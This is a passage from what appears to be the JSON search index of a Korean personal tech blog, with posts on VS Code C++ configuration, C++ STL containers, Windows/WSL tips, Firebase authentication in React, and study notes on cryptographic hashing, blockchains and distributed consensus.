(x86)/mingw-w64/i686-8.1.0-posix-dwarf-rt_v6-rev0/mingw32/bin/g++.exe\u0026#34;,\r\u0026#34;C_Cpp_Runner.debuggerPath\u0026#34;: \u0026#34;C:/Program Files (x86)/mingw-w64/i686-8.1.0-posix-dwarf-rt_v6-rev0/mingw32/bin/gdb.exe\u0026#34;,\r\u0026#34;files.associations\u0026#34;: {\r\u0026#34;hash_map\u0026#34;: \u0026#34;cpp\u0026#34;\r}\r} # launch.json\r{\r\u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;,\r\u0026#34;configurations\u0026#34;: [\r{\r\u0026#34;name\u0026#34;: \u0026#34;C/C++ Runner: Debug Session\u0026#34;,\r\u0026#34;type\u0026#34;: \u0026#34;cppdbg\u0026#34;,\r\u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;,\r\u0026#34;args\u0026#34;: [],\r\u0026#34;stopAtEntry\u0026#34;: false,\r\u0026#34;cwd\u0026#34;: \u0026#34;f:/Documents/GitHub/acmicpc/15997\u0026#34;,\r\u0026#34;environment\u0026#34;: [],\r\u0026#34;program\u0026#34;: \u0026#34;동작시킬 프로그램 경로\u0026#34;,\r\u0026#34;internalConsoleOptions\u0026#34;: \u0026#34;openOnSessionStart\u0026#34;,\r\u0026#34;MIMode\u0026#34;: \u0026#34;gdb\u0026#34;,\r\u0026#34;miDebuggerPath\u0026#34;: \u0026#34;C:/Program Files (x86)/mingw-w64/i686-8.1.0-posix-dwarf-rt_v6-rev0/mingw32/bin/gdb.exe\u0026#34;,\r\u0026#34;externalConsole\u0026#34;: false,\r\u0026#34;setupCommands\u0026#34;: [\r{\r\u0026#34;description\u0026#34;: \u0026#34;Enable pretty-printing for gdb\u0026#34;,\r\u0026#34;text\u0026#34;: \u0026#34;-enable-pretty-printing\u0026#34;,\r\u0026#34;ignoreFailures\u0026#34;: true\r}\r]\r}\r]\r} # tasks.json\r{\r// See https://go.microsoft.com/fwlink/?LinkId=733558\r// for the documentation about the tasks.json format\r\u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;,\r\u0026#34;tasks\u0026#34;: [\r{\r\u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;,\r\u0026#34;label\u0026#34;: \u0026#34;execute\u0026#34;,\r\u0026#34;command\u0026#34;: \u0026#34;${fileDirname}/${fileBasenameNoExtension}.exe\u0026#34;,\r\u0026#34;group\u0026#34;: {\r\u0026#34;kind\u0026#34;: \u0026#34;test\u0026#34;,\r\u0026#34;isDefault\u0026#34;: true\r},\r\u0026#34;problemMatcher\u0026#34;: []\r},\r{\r\u0026#34;type\u0026#34;: \u0026#34;cppbuild\u0026#34;,\r\u0026#34;label\u0026#34;: \u0026#34;C/C++: g++.exe 활성 파일 빌드\u0026#34;,\r\u0026#34;command\u0026#34;: \u0026#34;C:\\\\Program Files (x86)\\\\mingw-w64\\\\i686-8.1.0-posix-dwarf-rt_v6-rev0\\\\mingw32\\\\bin\\\\g++.exe\u0026#34;,\r\u0026#34;args\u0026#34;: [\r\u0026#34;-fdiagnostics-color=always\u0026#34;,\r\u0026#34;-g\u0026#34;,\r\u0026#34;${file}\u0026#34;,\r\u0026#34;-o\u0026#34;,\r\u0026#34;${fileDirname}\\\\${fileBasenameNoExtension}.exe\u0026#34;\r],\r\u0026#34;options\u0026#34;: {\r\u0026#34;cwd\u0026#34;: \u0026#34;${fileDirname}\u0026#34;\r},\r\u0026#34;problemMatcher\u0026#34;: [\r\u0026#34;$gcc\u0026#34;\r],\r\u0026#34;group\u0026#34;: \u0026#34;build\u0026#34;,\r\u0026#34;detail\u0026#34;: \u0026#34;컴파일러: \\\u0026#34;C:\\\\Program Files (x86)\\\\mingw-w64\\\\i686-8.1.0-posix-dwarf-rt_v6-rev0\\\\mingw32\\\\bin\\\\g++.exe\\\u0026#34;\u0026#34;\r}\r]\r} 단축키 Ctrl + Shift + P 단축키로 명령을 일일이 수행해도 되지만, 단축키를 설정해 바로 실행하는게 빠르다. 파일 -\u0026gt; 기본설정 -\u0026gt; 바로가기키 (Ctrl + K \u0026amp; Ctrl + S) 를 누르고, 우측 상단 \u0026lsquo;바로가기 키 열기\u0026rsquo; 를 클릭하여 단축키를 직접 입력한다. // 키 바인딩을 이 파일에 넣어서 기본값 재정의\r[\r{\r\u0026#34;key\u0026#34;: \u0026#34;ctrl+alt+c\u0026#34;,\r\u0026#34;command\u0026#34;: \u0026#34;workbench.action.tasks.build\u0026#34;,\r},\r{\r\u0026#34;key\u0026#34;: \u0026#34;ctrl+alt+e\u0026#34;,\r\u0026#34;command\u0026#34;: \u0026#34;workbench.action.tasks.test\u0026#34;,\r}\r] ","permalink":"https://aswinblue.github.io/Blog/post/developtips/vscode/","summary":"VS code visual studio code 사용법 개발환경 C / C++ 컴파일러 gcc 혹은 mingw 설치가 필요하다. 인터넷에서 설치하도록 한다. 설정파일 컴파일 및 실행을 위해서는 launch.json, setting.json, tasks.json 파일이 필요하다. vs code에서 알아서 작성해 주지만, 기본 설정으로 부족한 부분은 수정해야 한다. # settings.json\r{\r\u0026#34;C_Cpp_Runner.cStandard\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;C_Cpp_Runner.cppStandard\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;C_Cpp_Runner.msvcBatchPath\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;C_Cpp_Runner.warnings\u0026#34;: [\r\u0026#34;-Wall\u0026#34;,\r\u0026#34;-Wextra\u0026#34;,\r\u0026#34;-Wpedantic\u0026#34;\r],\r\u0026#34;C_Cpp_Runner.enableWarnings\u0026#34;: true,\r\u0026#34;C_Cpp_Runner.warningsAsError\u0026#34;: false,\r\u0026#34;C_Cpp_Runner.compilerArgs\u0026#34;: [],\r\u0026#34;C_Cpp_Runner.linkerArgs\u0026#34;: [],\r\u0026#34;C_Cpp_Runner.includePaths\u0026#34;: [],\r\u0026#34;C_Cpp_Runner.includeSearch\u0026#34;: [\r\u0026#34;*\u0026#34;,\r\u0026#34;**/*\u0026#34;\r],\r\u0026#34;C_Cpp_Runner.","title":"VsCode"},{"content":"C++ STL 자료구조 map key-value 쌍으로 이루어진 tree형태의 자료구조 중복을 허용하지 않음 C++에서는 red black tree로 구현되어 삽입,삭제가 O(log n) 안에 이루어진다. 내부적으로 key를 기준으로 오름차순으로 자료를 정렬한다. 헤더 : #include \u0026lt;map\u0026gt;\n선언 : map\u0026lt;int, int\u0026gt; map1;\n내림차순으로 선언 : map \u0026lt;int, int, greater\u0026gt; map2 삽입 : insert : map1.insert({\u0026quot;key\u0026quot;,VALUE}) [] : map1[\u0026quot;key\u0026quot;] = VALUE 삭제 : 특정 index : map1.erase(map1.begin()+2) 특정 key : map1.erase(KEY) 구간 : map1.erase(map1.begin(), map1.end()) 전체 : map1.clear() 검색 : map\u0026lt;int, int\u0026gt;::Iterator res;\rif ((res = map1.find(KEY)) != m.end()) {\rres -\u0026gt; first; // key\rres -\u0026gt; second; // value\r} 반복문 : for (auto itr = map1.begin(); itr != map1.end(); itr++) {\ritr-\u0026gt;first // key\ritr-\u0026gt;second // value\r} hash map hash table을 이용한 자료구조 정렬이 필요없는 비순차적 구조 헤더 : #include\u0026lt;hash_map\u0026gt;\n선언 : hash_map\u0026lt;int, float\u0026gt; h1\n삽입 :\ninsert 구문 : h1.insert(hash_map\u0026lt;int, float\u0026gt;::value_type(1,2.0f)) [] 구문 : h1[1] = 2.0f 검색 : hash_map\u0026lt;int, float\u0026gt;::Iterator res;\rif ((res = h1.find(10)) != h1.end()) {\rres-\u0026gt;first; // key\rres-\u0026gt;second; // value\r} 반복문 for (auto itr = h1.begin(); itr != h1.end(); itr++) {\ritr-\u0026gt;first; // key\ritr-\u0026gt;second; // value\r} 삭제 : 특정 index : h1.erase(h1.begin()) 특정 key : h1.erase(1) 구간 : h1.erase(h1.begin(), h1.end()) 전체 : h1.clear() Heap 헤더: #include\u0026lt;queue\u0026gt; 선언: min queue : priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; Heap max queue : priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, less\u0026lt;int\u0026gt;\u0026gt; Heap greater, less가 반대로 되어있음에 주의한다. 활용: Heap.push() : 삽입 Heap.top() : 가장 작은/큰 값 Heap.pop() : top 값을 삭제 Heap.size() : 인자 개수 Heap.empty() : size가 1 이상이면 false, 아니면 true Tueple std::tueple\u0026lt;TYPE1, TYPE2\u0026gt; : 두 자료형을 쌍으로 묶어서 tueple 자료형으로 구성 std::get\u0026lt;0\u0026gt;(tp) : 튜플 타입 \u0026rsquo;tp\u0026rsquo; 에서 첫번쨰 요소(TYPE1) 가져옴 std::get\u0026lt;1\u0026gt;(tp) : 튜플 타입 \u0026rsquo;tp\u0026rsquo; 에서 두번쨰 요소(TYPE2) 가져옴 정렬 stable_sort 오름차순 혹은 내림차순으로 정렬하되, 같은 값의 경우 기존의 순서를 유지하는 정렬방식 int v[10];\rint idx[10];\r// 오름차순 정렬\rstable_sort(idx, idx + 10, [](int a, int b){return a \u0026gt; b;});\r// index를 이용한 정렬\rstable_sort(idx, idx + 10, [\u0026amp;v](int a, int b){return v[a] \u0026gt; v[b];}); ","permalink":"https://aswinblue.github.io/Blog/post/c++/c++_stl/","summary":"C++ STL 자료구조 map key-value 쌍으로 이루어진 tree형태의 자료구조 중복을 허용하지 않음 C++에서는 red black tree로 구현되어 삽입,삭제가 O(log n) 안에 이루어진다. 내부적으로 key를 기준으로 오름차순으로 자료를 정렬한다. 헤더 : #include \u0026lt;map\u0026gt;\n선언 : map\u0026lt;int, int\u0026gt; map1;\n내림차순으로 선언 : map \u0026lt;int, int, greater\u0026gt; map2 삽입 : insert : map1.insert({\u0026quot;key\u0026quot;,VALUE}) [] : map1[\u0026quot;key\u0026quot;] = VALUE 삭제 : 특정 index : map1.erase(map1.begin()+2) 특정 key : map1.erase(KEY) 구간 : map1.erase(map1.begin(), map1.end()) 전체 : map1.","title":"C++_stl"},{"content":"#MS Window\nMS window 사용시 필요한 편이 기능들을 나열 WSL2 윈도우에서 리눅스를 실행하는 방법이다. windows 10 이상부터 지원 가능하며, microsoft store에서 ubuntu를 설치하는 방식이다. PowerShell을 관리자 권한으로 실행하여 아래 명령어 입력 $ dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n$ dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n$ wsl \u0026ndash;set-default-version 2\nWSL 콘솔에서 explorer.exe . 를 입력하면 현재 경로를 윈도우의 파일 탐색기로 열 수 있다. 해당 경로에 파일을 옮기면 윈도우-리눅스 간 파일 이동이 가능하다. 환경변수 환경변수 설정시 컴퓨터를 재부팅하지 않고 적용하는 방법 콘솔에 taskkill /f /im explorer.exe, explorer.exe 명령을 순서대로 입력한다. 작업표시줄이 없어졌다 생겨나면 적용이 된 것이다. 켜져있던 탐색기는 복원되지 않으니 주의 batch call 기본 command가 아닌 package command를 수행할 경우, batch파일에 명령어를 그대로 넣어서 수행하면 첫번째 줄만 수행될 수 있다. 이때 call 명령어를 사용해주면 여러 라인을 실행 가능하다. ex) call npm run build\rcd server\rcall gradle wrapper 리눅스에서 파일 가져오기 scp 명령을 사용해서 리눅스에서 파일을 가져올 수 있다. scp \u0026lt;계정\u0026gt;@\u0026lt;리눅스_IP주소\u0026gt;:리눅스에서_가져올_파일_경로 윈도우에_저장할_경로 형태로 사용 가능하다. ex) scp kim@10.162.32.11:target_file C:\\ : C 경로에 target_file을 받아온다. target_file에 절대경로를 사용하는게 좋다. 상대경로를 사용할 시 절대 경로는 /home/kim/target_file 가 된다. ","permalink":"https://aswinblue.github.io/Blog/post/developtips/window/","summary":"#MS Window\nMS window 사용시 필요한 편이 기능들을 나열 WSL2 윈도우에서 리눅스를 실행하는 방법이다. windows 10 이상부터 지원 가능하며, microsoft store에서 ubuntu를 설치하는 방식이다. PowerShell을 관리자 권한으로 실행하여 아래 명령어 입력 $ dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n$ dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n$ wsl \u0026ndash;set-default-version 2\nWSL 콘솔에서 explorer.exe . 를 입력하면 현재 경로를 윈도우의 파일 탐색기로 열 수 있다. 해당 경로에 파일을 옮기면 윈도우-리눅스 간 파일 이동이 가능하다.","title":"Window"},{"content":"Firebase with React react에서 firebase를 활용하는 방법 firebase SDK를 설치하거나 웹상에서 설치없이 사용하는 방법은 firebase 기본을 참조 인증 (Auth) firebase 로 계정 생성 및 로그인 firebase API를 import하여 사용 \u0026lt;AppFirebase.js\u0026gt; import firebase from \u0026#34;firebase/compat/app\u0026#34;;\rimport \u0026#34;firebase/compat/auth\u0026#34;;\rconst firebaseConfig = {\rapiKey: process.env.REACT_APP_API_KEY,\rauthDomain: process.env.REACT_APP_AUTHDOMAIN,\rprojectId: process.env.REACT_APP_PROJECTID,\rstorageBucket: process.env.REACT_APP_STORAGEBUCKET,\rmessagingSenderId: process.env.REACT_APP_MESSAGINGSENDERID,\rappId: process.env.REACT_APP_APPID\r};\rexport default firebase.initializeApp(firebaseConfig);\rexport const authService = firebase.auth(); AppFirebase.js 를 활용하여 business logic에 필요한 로그인 / 회원가입 기능을 구현 \u0026lt;Auth.js\u0026gt; import { authService } from \u0026#34;../components/AppFirebase\u0026#34;;\rconst data = await authService.createUserWithEmailAndPassword(email, password) // email, passwd로 계정 생성\rconst data = await authService.signInWithEmailAndPassword(email, password) // email, passwd로 로그인 createUserWithEmailAndPassword / signInWithEmailAndPassword 실행 이후 authService.currentUser를 참조하면 user 정보를 받아올 수 있다. 하지만, authService.currentUser 정보를 갱신하는데는 시간이 걸린다. firebase API에서는 observer를 등록하여 currentUser의 변경 시점을 확인할 수 있다. currentUser 변경시점에 특정함수 동작 user 정보가 갱신된 시점에 특정 동작을 원한다면, 아래와 같이 onAuthStateChanged 함수를 사용하면 된다. authService.onAuthStateChanged((user) =\u0026gt; { /* something to do */ }}); 로그아웃 authService.signOut() 함수를 호출하여 로그아웃이 가능하다. 참고로 크롬 웹 디버깅 화면에서 \u0026lsquo;Application\u0026rsquo;탭에 들어가서 IndexedDB -\u0026gt; firebaseLocalDb 안의 내용을 🚫버튼으로 삭제해 주면 로그인 정보가 사라진다. 에러 authService의 함수(createUserWithEmailAndPassword, signInWithEmailAndPassword, \u0026hellip;) 사용시 에러가 발생할 수 있으므로, try, catch문으로 묶어서 사용한다. try {\rlet data\rdata = await authService.createUserWithEmailAndPassword(email, password)\r} catch(error) {\rconsole.log(error.code) // 에러의 원인이 코드 형태로 출력된다.\rconsole.log(error.message) // 에러의 원인이 메시지 형태로 출력된다.\r} ref) 오류발생 원인\n6자리 이하로 비밀번호 생성시 동일한 e-mail로 계정 생성시 Google 계정으로 로그인 firebase에서는 google, facebook 등 계정으로 로그인 할 수 있도록 기능을 제공한다. 팝업으로 로그인을 유도하는 방식과, redirect로 로그인하는 방식이 있다. import { authService, firebaseModule } from \u0026#34;../components/AppFirebase\u0026#34;;\rconst onSocialClick = async (event) =\u0026gt; {\rtry {\rlet provider;\rprovider = new firebaseModule.auth.GoogleAuthProvider(); //\r} catch (error) {\rconsole.log(error);\r}\rawait authService.signInWithPopup(provider); // 팝업으로 로그인\r} ","permalink":"https://aswinblue.github.io/Blog/post/database/firebase_react/","summary":"Firebase with React react에서 firebase를 활용하는 방법 firebase SDK를 설치하거나 웹상에서 설치없이 사용하는 방법은 firebase 기본을 참조 인증 (Auth) firebase 로 계정 생성 및 로그인 firebase API를 import하여 사용 \u0026lt;AppFirebase.js\u0026gt; import firebase from \u0026#34;firebase/compat/app\u0026#34;;\rimport \u0026#34;firebase/compat/auth\u0026#34;;\rconst firebaseConfig = {\rapiKey: process.env.REACT_APP_API_KEY,\rauthDomain: process.env.REACT_APP_AUTHDOMAIN,\rprojectId: process.env.REACT_APP_PROJECTID,\rstorageBucket: process.env.REACT_APP_STORAGEBUCKET,\rmessagingSenderId: process.env.REACT_APP_MESSAGINGSENDERID,\rappId: process.env.REACT_APP_APPID\r};\rexport default firebase.initializeApp(firebaseConfig);\rexport const authService = firebase.auth(); AppFirebase.js 를 활용하여 business logic에 필요한 로그인 / 회원가입 기능을 구현 \u0026lt;Auth.","title":"Firebase_react"},{"content":"Cryptocurrency Cryptographic Hash function hash function은 아래와 같은 속성을 갖는다. 모든 크기의 String을 input 으로 받는다. 정해진 크기의 output을 생성한다. (bitcoin에서는 256bit) 적당한 시간 안에 계산이 가능하다. (계산 시간이 너무 길지 않다) cryptographic hash function은 아래와 같은 security 속성을 추가로 갖는다.\ncollision-free hiding puzzle-friendly 속성1. collision-free x != y 라면, H(x) = H(y) 인 경우를 찾을 수 없어야 한다. 이 말은 collision 이 존재하지 않는다는 뜻은 아니다. num(possible_input) \u0026gt; num(possible_outputs) 이다. \u0026lsquo;찾을 수 없다\u0026rsquo; 라는 말은, collision이 존재하지만, hahs function의 결과를 예측할 수 없다는 뜻이다. 실제로, 2^130 개의 무작위 수를 선택하여 hash function을 돌렸을 때, 99.8%의 확률로 충돌이 발생한다. 하지만 이 수치는 천문학적으로 크기 때문에 걱정할 필요가 없다. (collision을 발견할 확률은 인류가 만든 최고의 컴퓨터로 우주 생성시부터 계산을 해도, 2초뒤 지구에 운석이 떨어질 확률만큼 낮다.) collision을 쉽게 구하는 방법이 있는가? -\u0026gt; 특정 hash function에 대해서는(SHA256에 대해서도 최단기간 collision을 찾아내는 방법이 알려져 있다.) 가능하지만, 대부분은 그렇지 않다. hash as message digest collision을 구하는 것이 매우 어렵기 때문에, H(x) = H(y)라면, x = y라고 확신해도 된다. 즉, hash를 이용해 데이터 전송/비교에 드는 비용을 절감 가능하다. (전체 message 대신 hash만 비교) 속성2. hiding H(x)를 갖고 x를 유추할 수 없다. hiding 속성을 가지려면 아래와 같은 방법을 사용한다. high min-entropy 를 가진 무작위 상수 \u0026lsquo;r\u0026rsquo;을 x와 조합(concatenate)하여 hash function의 input에 넣으면 hiding 속성을 갖게 된다. (H(r|x)) high min-entropy 란 넓고 고르게 퍼져있음을 뜻한다. 즉, 넓은 선택범위 안에서 특정 값이 특출나게 여려번 중복해서 뽑히지 않는다는 뜻이다. (no particular value is chosen with more than negligible probability) commitment 편지를 동봉하듯 데이터가 가지고 있는 내용을 공개하지 않고 데이터를 공개하는 것\ncommitment를 위해 제공하는 commitment API 는 다음과 같이 동작한다.\n(commitment, key) = commit(msg) msg를 동봉하고, 그 결과로 commitment와 key를 생성한다. commitment는 봉투에 해당하고, key는 열쇠에 해당한다. commit은 hash function으로 다음과 같이 구성된다. commit(msg) = (H(key | msg), key) 즉, (commitment, key) = H(key|msg), key 이다. match = verify(commitment, key, msg) commitment, key, msg 세가지를 이용해 msg가 올바른지 검증한다. commitment는 두 가지 security property를 갖는다.\nhiding : commitment만으로 msg를 파악할 수 없다.\nbinding : msg1 != msg2 라면, verify(commit(msg1),msg2) != false 이다.\n속성3. puzzle-friendly 임의의 \u0026lsquo;k\u0026rsquo;가 high min-entropy 속성을 갖고 있다면, H(k|x) = y 를 만족시키는 x를 찾을 수 없다. 즉, 특정 값 y가 나오도록 x를 임의로 조작할 수 없다는 뜻이다. 앞서 말한 hash function으로는 여러가지 종류들이 있다. 그중 SHA-256에 대해 살펴보자.\nSHA-256 동작 방법은 아래와 같다. message를 512bit씩 잘라서, 256bit의 데이터\u0026rsquo;IV\u0026rsquo;와 함께 hashing 연산 \u0026lsquo;C\u0026rsquo;을 수행한다. 위 결과와 다음 256bit 메시지를 다시 \u0026lsquo;C\u0026rsquo;연산시킨다. 이를 메시지 끝까지 반복한다. 마지막 메시지가 256bit가 되지 않는다면 (10*|length) 로 이루어진 padding을 집어넣어 연산한다. collision-free를 만족하기 때문에 \u0026lsquo;C\u0026rsquo; 연산 각각도 collision-free이다. Hash Pointer data structure의 hash와 동일하게, hash pointer는 특정 데이터를 가리키는 pointer이다. 다만, 데이터는 info와 cryptographic hash를 포함한다. hash pointer를 이용하면 데이터와, 데이터의 변경여부를 확인할 수 있다. hash pointer를 이용하여 다양한 data structure를 구성할 수 있다. hash pointer를 이용해 linked list를 구성하면 흔히 block chain이라 불리는 구조가 형성된다. linked-list의 block 하나가 \u0026lsquo;주소 + 데이터\u0026rsquo; 로 이루어져 있는데, block chain 에서는 \u0026lsquo;주소\u0026rsquo; 부분이 이전 block의 hash값(hash + data 의 hash값)으로 구성되어 있다. ex) H(root) - B1[data1, H(B2)] - B2[data2, H(B3)] - B3[data3, H(B4)] ... hash값을 이용하여 다음 데이터가 수정이 이루어졌는지 확인 가능하다. (tamper-evident) data3을 수정하면 H(B3)값과 B2의 H()값이 일치하지 않게 된다. B2의 H()값을 수정하면 이번에는 H(B2)와 B1의 H()값이 일치하지 않는다. 연쇄적으로 B2, B1, root까지 수정하면 다시 모든 hash값이 맞아 떨어지게 된다. 가장 최초의 block을 \u0026lsquo;genesis block\u0026rsquo;이라 부른다. hash pointer로 binary tree를 구성할 수도 있다. (Merkle tree) tree의 leaf node에는 data가 들어가고, 이후 root node 포함 모든 node들은 left\u0026amp;right 자식 node들의 hash값을 갖게 된다. 데이터가 변경되면, 부모 node의 hash값이 연쇄적으로 어긋나게 되고, 최종적으로 root node의 hash값 R과 달라지게 된다. (H(root) 값을 기억하면 데이터 변경을 감지할 수 있게 된다.) 데이터 검증을 위해 모든 block들을 사용해야 했던 기존 block chain과 다르게, Merkle tree는 O(log n) 개의 node만으로도 데이터 무결성을 증명할 수 있다. 검증 시간 및 검색, 정렬 시간이 직렬 데이터 구조보다 절감된다. hash pointer는 cycle이 없는 모든 pointer-based data structure에 사용 가능하다. Digital Signature Digital Signature 은 아래와 같은 속성을 지녀야 한다. only you can sign, but anyone can verify : 본인만 사용 가능하며 본인임을 인증할 수 있어야 한다. tied to a particular document : 서명과 인증할 대상이 분리 불가능해야 한다. digital signature의 API는 아래와 같을 것이다. (secret_key, public_key) := generateKeys(size_of_key) : Key를 생성하는 함수. randomize 되어있어야 한다. sig := sign(secret_key, message) : 특정 message에 서명을 하는 함수 마찬가지로 randomize가 잘 되어있어야 한다. message의 길이가 너무 길면 처리하기 힘드므로, Hash function의 collision-free 특성을 이용해 message의 hash 값을 쓰도록 한다. isValid := verify(public_key, message, sig) : public key와 message, sig의 조합으로 알맞은 서명인지 검증하는 함수 Requirements for signature 위 API로 만든 signature의 조건으로는 아래 두가지가 있다. public_key, sig, message로 message가 당신의 것임을 인증 가능 다른 이가 당신의 public_key, sig를 이용해 다른 message′ 에 서명을 할 수 없어야 한다. secret_key 를 공개하지 않고, public key를 타인에게 공개한 후, 수 많은 message [m0, m1, m2, \u0026hellip;] 에 대해 서명을 한 결과 [sign(m0), sign(m1), sign(m2), \u0026hellip;]를 타인에게 주었을 때, 그 사람이 새로운 메시지 m′에 대한 서명 sign(m′)을 만들어 낼 확률은 극히 낮아야 한다. + Hash pointer를 sign하면, hash pointer 뿐만 아니라, pointer가 가리키는 전체 구조를 sign하는 효과를 얻을 수 있다. + bitcin은 ECDSA(Elliptic Curve Digital Signature Algorithm) 표준을 사용한다.\nPublic Keys \u0026amp; Secret Keys public key는 개인을 식별할 수 있는 \u0026lsquo;식별자\u0026rsquo;이다. public key는 모두에게 공개되며, public key로 개개인을 구분할 수 있다. secret key는 public key로 특정 발언을 할 수 있는 \u0026lsquo;권한\u0026rsquo; 이다. public key 와 secret key는 pair로 존재하며, \u0026lsquo;identity\u0026rsquo; (고유함)를 구성한다. identity는 아무 때나, 몇개든 만들 수 있으며, 모든 identity를 관리하기위한 중앙 체제가 필요없다. (decentralized) 다만, 랜덤 요소가 약하다면 다수의 public key와 message를 통해 secret key가 유출될 가능성이 있음에 주의한다. 이러한 속성 덕분에 bitcoin에서도 identity를 \u0026lsquo;address\u0026rsquo; 라는 용어로 사용한다. address 는 탈 중앙화로 동작하지만, 개인이 만든 address는 즉시 identity 속성을 갖지는 못한다. address가 identity 속성을 갖게 하기 위해서는 다른 address들과 엮어야 하는데, observer가 주기적으로 이 동작을 수행하도록 해야한다. address를 추적하면 address 명의로 수행한 행위들을 추출할 수 있는데, 이 내용으로 특정 개인을 추정할 수 있는 취약점이 있다. Cryptocurrency CryptoCurrency(이하 coin)에는 다음과 같은 조건이 필요하다. public key, unique coin id 를 이용해 coin을 만들 수 있어야 한다. A 가 unique coin id 를 인자로 coin을 만들고, 이를 public key로 sign하는 방식으로 coin을 생성한다.([pk_A, createCoin(unique_coin_id)]) coin은 다른 사람에게 전달 가능해야 한다. A 가 B 에게 coin을 전달한다고 할 때, 만들어진 coin을 가리키는 거래내역 block을 생성한다. [pk_A, pay_to(pk_B)] -\u0026gt; [pk_A, createCoin(unique_coin_id)]\npay_to 블럭의 hash pointer가 createCoin 블럭을 가리킨다. 이러면 coin의 소유자가 A에서 B로 넘어간 것이다. 이후 B가 C로 coin을 전달하면 [pk_B, pay_to(pk_C)] -\u0026gt; [pk_A, pay_to(pk_B)] -\u0026gt; [pk_A, createCoin(unique_coin_id)] 형태가 될 것이다.\n모든 chain을 따라가면 coin이 누구의 소유인지 확인 가능하다.\ndouble spending attack coin의 chain은 직렬로 이루어져야 한다. 만약 branch가 생겨나면 소유권이 꼬이게 된다. 아래와 같이 B가 특정 coin을 두번 이상 spend 하는 형태가 발생할 수 있다. [pk_B, pay_to(pk_C)] [pk_B, pay_to(pk_D)]\r↓ ↓\r[pk_A, pay_to(pk_B)]\r↓\r[pk_A, createCoin(unique_coin_id)] 이러한 경우, 이 코인은 secure하지 않기 때문에 cryptoCurrency로서는 좋지 않다.\ndouble spending attack을 해소하려면 history를 관리하면 된다.\nhistory는 위에서 살펴본 block chain(hash pointer를 이용한 linked list) 형태로 구성한다.\n거래내역(transactions) 들을 content로 갖는 block들 생성하고, 이를 hash pointer로 연결한다. (보통 한 block 안에는 다수의 transaction들을 포함한다.) 관리자가 root hash 및 block들을 public key로 인증하여 publish하면, history가 관리되어 안정성이 확보된다. H() -\u0026gt; ... -\u0026gt; [H(), transaction3] -\u0026gt; [H(), transaction2] -\u0026gt; [H(), transaction1] transaction들은 관리자에 의해 publish되어야 한다. (pk로 sign)\ntransaction들은 다음과 같이 구성된다.\ncreate coin value와 recipient를 설정한다. 생성한 coin에 고유 id를 붙인다. (trainsaction Id + index로 조합) pay consume -\u0026gt; create 작업을 수행한다. consume은 coin id를 이용해 coin을 폐기하는 작업이다. create 작업은 create coin과 동일하다. 작업을 수행하기 전 다음 사항들을 validate 하고 수행한다. 1) consume하는 coin이 valid한지 체크 2) consume 하는 coin이 이미 consume되지 않았는지 체크(not double spend) 3) consume 되는 양과 create 되는 양이 같은지 체크 4) consume 되는 coin들은 각 owner에 의해 sign 되어있는지 체크 - 모든 사항이 확인되면 관리자에 의해 publish된다. -\u0026gt; double spending 문제는 해결했지만 centralization 문제가 발생한다. (\u0026lsquo;관리자\u0026rsquo; 가 중앙 체제에 해당)\nDecentralization Crypto currency를 구성하기 위해서는 탈 중앙화가 이루어져야 한다. 앞서 보았듯이 거래 장부(transaction)를 관리하기 위해서는 이를 인증해 줄 주체가 필요했다. 이 주체를 분산시키는 것이 필요하다. (Distributed Consensus) Dsitributed Consensus 분산의 개념은 암호화 회폐 이전에 서버 동작에서도 논제가 되었다. 여러개의 서버가 병렬로 동작할 때, consistency를 유지하기 위해 distributed consensus protocol이 필요했다. 방법중 하나로 distributed key-value store 방식이 있는데, DNS, public key directory, stock trade 등 여러 방면에서 사용되고 있고, altcoin에도 사용되고 있다. public consensus in crypto currency 암호화 화폐에서는 transaction가 모여 block을 이루고, 이를 모아 block chain을 만든다.\nblock chain에 들어간 모든 block들은 consensus된 내용들이어야 한다.\ntransaction 하나를 consensus 해도 괜찮지만, block 단위로 consensus하여 효율을 높인다.\npeer to peer 통신은 완벽하지 않기 때문에 여러개의 각기 다른 block들을 비교해야 한다.\n비교한 block들 중 특정 block을 block chain 에 추가하면, 어떤 transaction은 빠질 수도 있는데, 이는 다음번 consensus때 까지 대기해야 한다.\nNode간 충돌은 consensus protocol이 쉽지 않은 이유중 하나이다. 모든 Node들이 연결되어 있지 않기 때문에 Node간 충돌은 불가피하다. network latency 혹은 fault도 Node간 차이를 발생하는 원인이 된다. Byzantine general problems 는 consensus problem 중 하나이다. Fischer-Lynch-Paterson impossibility result 라는 이름의 증명은 하나의 fault만 존재해도 consensus는 불가능하다는 것을 증명한 내용이다.\n그럼에도 불구하고 대표적인 consensus protocol들이 있다. 그중 하나는 Paxos 프로토콜이다.\nPaxo 프로토콜은 inconsistent 한 상황은 절대 발생시키지 않지만, 특정한 상황이 되면 dead-lock 처럼 로직이 멈춰 더이상 동작하지 않는 상태가 발생할 수 있다. 현실 bitcoin에서는 이론에 비해 consensus가 더 잘 이루어지고 있다. 이론은 아직 실제 현상을 따라잡아 가는 형태이지만, 여전히 이론은 예상치 못한 공격에 대한 대응과 bitcoin 생태계에서의 확신을 주기 위한 존재로서 중요하다.\n현실의 bitcoin에서는 어떤점이 다른가?\nbitcoin에서는 insentive의 개념이 있다. 정직하게 활동한 참여자에게는 insentive를 줌으로써 시스템에 우호적으로 활동할 계기를 준다.\n이는 bitcoin이 currency의 개념이기 때문에 가능하며, 이번의 모든 distributed consensus system 에서는 없었던 개념이다.\ninsentive를 통해 bitcoin은 distributed consensus system를 근본적으로 해결하지 않았지만, 해결책을 찾은 셈이다.\nconsensus system은 즉각적이지 않고, consensus를 수행하는데도 약 1시간 정도가 소요된다. 하지만 시간이 지날수록 transaction이 반영되지 않거나 잘못될 확률은 exponential하게 줄어들게 된다.\nconsensus without identity bitcoin에서는 persistent long term identities 없이 consensus가 이루어진다. 즉, node를 칭할 수 